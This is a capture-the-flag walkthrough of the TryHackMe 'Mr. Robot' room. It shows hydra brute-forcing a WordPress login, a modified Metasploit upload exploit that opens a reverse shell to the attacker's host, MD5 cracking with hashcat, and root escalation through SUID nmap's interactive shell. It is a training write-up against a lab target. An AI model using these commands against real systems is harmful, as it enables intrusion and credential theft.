# MrRobot

Notes from challenges I did @ <https://tryhackme.com>.

This is a full write up of the "Mr. Robot" CTF @ <https://tryhackme.com/room/mrrobot>.

Connect to tryhackme via openvpn e.g.: ```sudo openvpn 0xfab1.ovpn```

Please note:

- Flags are not fully written to avoid copy & paste ;)
- I used an SSH-Tunnel in case you are wondering why I have "localhost" instead of an IP mentioned.

## Flag 1

Let's have a look at the environment:

```sh
IP="10.10.236.216"
nmap -sC -sV $IP
nikto -h $IP
```

Since there is a php based website served on port 80 and 443 via apache let us have a look at the available folders:

```sh
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://$IP:80
```

We can see a lot of folders and that there is a wordpress login page.

Further things we can check:

- View html/css/js source -> nothing special
- View links on page -> text, videos, nothing special (but cool theme)
- View robots.txt -> first flag :)

In the robots.txt we find the first key ($IP/key-1-of-3.txt) and a dictionary file (probably for wordpress login @ $IP/login).

## Flag 2

Let's download the dictionary file "fsocity.dic" and have a look:

```sh
wget $IP/fsocity.dic
```

The file seems to be a password list but there are a lot of redunant entries. If we want to use this to brute-force login to the word-press admin portal we should remove all duplicate entries. We can use ```uniq``` for this but uniq expects a sorted list so we run the following:

```sh
sort fsocity.dic | uniq > uniqfsocity.dic
```

We can use hydra to brute-force http-post-form on the wordpress login page to find out the username. In case we get a "Invalid" the attempt failed.

```sh
hydra -L uniqfsocity.dic -p something $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid"
```

We find out the username "Elliot" is valid and abort hydra. Now let's use the same dictionary again to brute-force the password of Elliot. If a correct user logs in with an invalid password we can use "incorrect" as false trigger.

```sh
hydra -l Elliot -P uniqfsocity.dic -t 64 $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect."
```

This unfortunantly takes some time but after a while we get the correct password for Elliot: ER28-0652

With access to the wordpress backend we can start Metasploit to exploit wordpress for a reverse shell:

```sh
msfdb init
msfconsole
db_nmap -sV 10.10.236.216
search wp
use exploit/unix/webapp/wp_admin_shell_upload
show options
set PASSWORD ER28-0652
set USERNAME Elliot
set RHOST 10.10.236.216
set LHOST 10.9.193.173
set LPORT 6666
show options
exploit
```

Unfortunantly I get an error running this saying wordpress is not available.
After seaching the web I find out possibly we can just ignore those errors in the used script. So lets open the script and comment out what stops the script and see what happens:

```sh
locate wp_admin_shell_upload  
sudo nano /usr/share/metasploit-framework/modules/exploits/unix/webapp/wp_admin_shell_upload.rb # comment out def exploit -> #fail_with
```

and run the exploit once more:

```sh
reload
exploit
```

I now get a new error so i just comment out all "fail_with" after "def exploit" and re-run the exploit once more:

```sh
reload
show options
exploit
```

Finally the exploit works and we have a reverse shell :)
Now let's look around:

```sh
meterpreter > ls
Listing: /home/robot
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100400/r--------  33    fil   2015-11-13 02:28:21 -0500  key-2-of-3.txt
100644/rw-r--r--  39    fil   2015-11-13 02:28:21 -0500  password.raw-md5
```

We see key 2 "key-2-of-3.txt" but can't access it. However, we can access "password.raw-md5":

```sh
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

This looks like the hashed password of user "robot". Let's find out what hash type is used by running ```hash-identifier```.

```sh
hash-identifier c3fcd3d76192e4007dfb496cca67e13b

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Let's crack the MD5 hash with ```hashcat``` using the rockyou password list.

```sh
hashcat -m0 --force c3fcd3d76192e4007dfb496cca67e13b /home/0xfab1/rockyou.txt

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /home/0xfab1/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 3 secs

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Guess.Base.......: File (/home/0xfab1/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   313.5 kH/s (0.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 40960/14344384 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 36864/14344384 (0.26%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: hockey5 -> loser69
```

The password for robot is abcdefghijklmnopqrstuvwxyz.
So back to the reverse shell and lets login as user "robot":

```sh
meterpreter > shell
Process 2226 created.
Channel 4 created.
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ su -l robot
su -l robot
Password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
```

We now have access to "key-2-of-3.txt".

## Flag 3

Now as robot let us have a look at what we are allowed to do:

```sh
find / -user root -perm -4000 2>/dev/null

/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

We can exploit nmap (/usr/local/bin/nmap) with a vulnerability in the interactive mode since nmap is running with root priviledges but we can trigger it as user robot:

```sh
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
cd /root
ls
firstboot_done  key-3-of-3.txt
cat key-3-of-3.txt
```

And there we have flag 3.
